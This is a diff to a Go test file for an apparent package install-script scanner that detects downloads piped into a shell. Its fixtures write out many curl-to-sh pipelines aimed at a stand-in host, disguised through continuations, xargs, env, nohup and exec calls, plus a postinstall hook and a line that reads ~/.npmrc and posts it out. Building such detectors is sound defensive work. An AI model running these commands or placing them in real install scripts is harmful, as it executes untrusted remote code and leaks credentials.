@@ -990,6 +990,105 @@ func TestInstallScriptRuleTooDeepPackageJSON(t *testing.T) {
 	}
 }
 
+// A command continued over several lines is read joined, and a download piped into a shell is found by the
+// pipeline's stages: behind a command that only wraps the shell, in a shell script, a hook, and a string run by exec.
+func TestInstallContinuedAndWrappedCommands(t *testing.T) {
+	const evil = "curl -s https://evil.example.invalid/x"
+	for name, text := range map[string]string{
+		"continued.sh":   "#!/bin/sh\n" + evil + " \\\n  | sh\n",
+		"continued-3.sh": "#!/bin/sh\ncurl -s \\\n  https://evil.example.invalid/x \\\n  | \\\n  bash -s\n",
+		"crlf.sh":        "#!/bin/sh\r\n" + evil + " \\\r\n  | sh\r\n",
+		"xargs.sh":       "#!/bin/sh\n" + evil + ` | xargs -I{} bash -c "{}"` + "\n",
+		"env.sh":         evil + " | env X=1 sh\n",
+		"nohup.sh":       evil + " | nohup timeout 60 bash -s\n",
+		"stages.sh":      evil + " | gunzip | tee /tmp/a | tr -d '\\r' | setsid sh\n",
+		"both.sh":        evil + " \\\n  | xargs -I{} sh -c '{}'\n",
+		"decode.sh":      "echo aGk= | base64 -d | xargs -0 sh -c\n",
+		"official.sh":    "curl -s https://sh.rustup.rs >/dev/null; " + evil + " | sh\n",
+		"exec.js":        `require('child_process').execSync("` + evil + ` | xargs sh")` + "\n",
+		"exec-env.js":    `require('child_process').exec('` + evil + ` | env X=1 sh')` + "\n",
+		"template.js":    "execSync(`" + evil + " | nohup bash`)\n",
+		"string.js":      "require('child_process').execSync('" + evil + " \\\n| sh')\n",
+		"minified.js":    strings.Repeat("var a=1,b=2;function x(){return a+b}", 300) + ";require('child_process').exec('" + evil + "|xargs sh');" + strings.Repeat("var c=3;", 400) + "\n",
+		"system.py":      `os.system("` + evil + ` | env X=1 sh")` + "\n",
+		"continued.py":   "import os\ncmd = \"" + evil + " \" \\\n  \"| sh\"\nos.system(\"" + evil + " \\\n| sh\")\n",
+		"no-name":        evil + " \\\n| xargs sh\n",
+	} {
+		var s []InstallSignal
+		if strings.HasPrefix(name, "no-name") {
+			s = InstallScriptSignals(text)
+		} else {
+			s, _ = InstallFileSignals(name, text, nil)
+		}
+		if !installHas(s, "从网上下载代码直接运行") && !installHas(s, "把编码过的内容解开直接运行") {
+			t.Errorf("%s: not seen: %+v", name, s)
+		}
+	}
+	// The line is the one the command starts on, by the file's count.
+	s, _ := InstallFileSignals("i.sh", "#!/bin/sh\nset -e\n\n"+evil+" \\\n  | sh\necho done\n", nil)
+	if len(s) != 1 || !reflect.DeepEqual(s[0].Lines, []int{4}) {
+		t.Errorf("a continued command's lines: %+v", s)
+	}
+	// What a line shows by itself is still found there when it is also part of a continued command.
+	s, _ = InstallFileSignals("i.sh", "#!/bin/sh\ntrue \\\n  && "+evil+" | sh\n", nil)
+	if len(s) != 1 || !reflect.DeepEqual(s[0].Lines, []int{2, 3}) {
+		t.Errorf("a command on a continuation line: %+v", s)
+	}
+	// A hook's command of several lines, by the line of package.json the hook is on.
+	p, _ := ParseInstallPackage([]byte("{\n\"scripts\": {\n\"postinstall\": \"" + evil + ` \\\n  | sh"}}`))
+	if s := InstallHookSignals(p); len(s) != 1 || !installHas(s, "从网上下载代码直接运行") || !reflect.DeepEqual(s[0].Lines, []int{3}) {
+		t.Errorf("a hook continued over two lines: %+v", s)
+	}
+	p, _ = ParseInstallPackage([]byte(`{"scripts": {"install": "` + evil + ` | xargs -I{} bash -c '{}'"}}`))
+	if s := InstallHookSignals(p); !installHas(s, "从网上下载代码直接运行") {
+		t.Errorf("a hook with xargs: %+v", s)
+	}
+	// The file a hook runs, named on the next line.
+	root := t.TempDir()
+	writeFiles(t, root, map[string]string{"evil.js": "1", "x.sh": "1"})
+	p, _ = ParseInstallPackage([]byte(`{"scripts": {"postinstall": "node \\\n  evil.js && sh \\\n x.sh"}}`))
+	got := InstallPackageTargets(root, p)
+	if len(got) != 2 || got[0].Path != "evil.js" || got[0].Direct || got[1].Path != "x.sh" || got[1].Direct {
+		t.Errorf("a hook's file on the next line: %+v", got)
+	}
+
+	// What an install script may do stays quiet: the stages run nothing that came in, the installer is an official
+	// one, the pipeline is a pattern or a comment.
+	for name, text := range map[string]string{
+		"official.sh":  "curl -fsSL https://sh.rustup.rs | env RUSTUP_HOME=/opt/rustup sh -s -- -y\n",
+		"official2.sh": "curl -fsSL https://sh.rustup.rs \\\n  | sh -s -- -y\n",
+		"rm.sh":        "curl -s https://x.example.invalid/list | xargs rm -f\n",
+		"grep.sh":      "curl -s https://x.example.invalid/list | xargs grep -l bash\n",
+		"check.sh":     "curl -s https://x.example.invalid/list | xargs -n1 python3 scripts/check.py\n",
+		"jq.sh":        "curl -s https://x.example.invalid/a.json | env LC_ALL=C sort | timeout 5 jq .\n",
+		"tar.sh":       "curl -sL https://x.example.invalid/prebuilt.tgz \\\n  | tar xz -C \"$PWD/bin\"\n",
+		"tar2.sh":      "curl -sL \"$URL\" \\\n  -H 'Accept: application/octet-stream' \\\n  -o lib.tgz\ntar xzf lib.tgz\nmake\n",
+		"build.sh":     "./configure \\\n  --prefix=\"$PWD/build\" \\\n  --disable-shared\nmake -j4 && \\\n  make install\n",
+		"comment.sh":   "# curl -s https://x.example.invalid/a \\\n# | sh\necho ok\n",
+		"comment2.sh":  "# fetch it: curl -s https://x.example.invalid/a \\\necho ok | sh\n",
+		"tar.js":       "require('child_process').execSync('curl -sL ' + url + ' | tar xz -C ' + dir);\n",
+		"long.js":      "const msg = 'Downloading the prebuilt binary with curl, \\\nfalling back to a build from source';\nconsole.log(msg);\n",
+		"regex.js":     "const R = /curl .* \\| xargs sh/;\n",
+		"ctor.js":      "const R = new RegExp('curl -s https://x.example.invalid/a | env sh');\n",
+		"ctor.py":      "import re\nR = re.compile(r'curl -s https://x.example.invalid/a | xargs sh')\n",
+		"comment.js":   "// curl -s https://x.example.invalid/a | xargs sh\n",
+		"setup.py":     "subprocess.check_call(\"curl -sL https://x.example.invalid/lib.tgz | tar xz\", \\\n    shell=True)\n",
+	} {
+		if s, _ := InstallFileSignals(name, text, nil); len(s) > 0 {
+			t.Errorf("%s: %+v", name, s)
+		}
+	}
+	for _, hook := range []string{
+		`node-gyp rebuild \\\n  --release`, `prebuild-install \\\n || node-gyp rebuild`,
+		`curl -sL https://x.example.invalid/prebuilt.tgz | tar xz`, `node \\\n  -e \"process.exit(0)\"`,
+	} {
+		p, ok := ParseInstallPackage([]byte(`{"scripts": {"install": "` + hook + `"}}`))
+		if s := InstallHookSignals(p); !ok || len(s) > 0 {
+			t.Errorf("hook %q: %v %+v", hook, ok, s)
+		}
+	}
+}
+
 // installSlowSamples: half a megabyte each of what made the checks' time grow with the square of the hits.
 func installSlowSamples() map[string]string {
 	const size = 512 << 10
@@ -1010,6 +1109,15 @@ func installSlowSamples() map[string]string {
 		"secrets.js": fill("fs.readFileSync(os.homedir()+'/.npmrc');https.request({hostname:'c.example.invalid',method:'POST'})", ";"),
 		"assign.sh":  fill("RC=~/.zshrc\necho x >> \"$RC\"", "\n"),
 		"setup.py":   fill("os.system('curl -s https://x.example.invalid/a | sh')", "\n"),
+		// Continued lines, and what the reading by a pipeline's stages has to cut: many pipelines, quotes in quotes,
+		// hashes that may begin a comment.
+		"continued.sh": fill("curl -s https://x.example.invalid/a \\", "\n") + "| sh\n",
+		"short.sh":     fill("a \\", "\n") + "| sh\ncurl -s https://x.example.invalid/a | xargs sh\n",
+		"string.js":    fill("x('a \\\n b');require('child_process').execSync('curl -s https://x.example.invalid/a \\\n| xargs sh')", "\n"),
+		"xargs.js":     fill("require('child_process').execSync('curl -s https://x.example.invalid/a | xargs sh')", ";"),
+		"official.sh":  fill("curl -s https://sh.rustup.rs | sh; curl -s https://sh.rustup.rs | env sh", "; ") + "\ncurl -s https://x.example.invalid/a | sh\n",
+		"nested.sh":    fill(`sudo sh -c "sh -c 'echo never; curl -s https://x.example.invalid/a | xargs sh'"`, "\n"),
+		"hashes.js":    fill(strings.Repeat(`a # "b" `, 200)+";execSync('curl -s https://x.example.invalid/a | env sh')", "\n"),
 	}
 }
 
